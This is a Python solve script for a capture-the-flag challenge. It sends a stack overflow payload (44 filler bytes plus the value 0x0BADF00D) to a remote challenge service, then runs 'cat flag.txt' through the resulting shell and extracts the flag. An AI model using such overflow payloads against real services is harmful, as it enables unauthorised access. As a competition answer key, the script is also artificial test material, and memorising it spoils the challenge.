#!/usr/bin/env python3
import os
import re
import socket
import struct
import sys


HOST = os.environ.get("HOST", "chal.thjcc.org")
PORT = int(os.environ.get("PORT", "11037"))


def recv_all(sock):
    chunks = []
    sock.settimeout(2)
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def main():
    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        prompt = sock.recv(4096)
        sys.stderr.buffer.write(prompt)

        payload = b"A" * 44 + struct.pack("<I", 0x0BADF00D)
        sock.sendall(payload + b"\n")
        sock.sendall(b"cat flag.txt; exit\n")
        output = recv_all(sock)

    sys.stdout.buffer.write(output)
    flag = re.search(rb"THJCC\{[^\r\n}]+\}", output)
    if not flag:
        raise RuntimeError(f"flag not found in response: {output!r}")
    print(f"[+] flag: {flag.group().decode()}", file=sys.stderr)


if __name__ == "__main__":
    main()
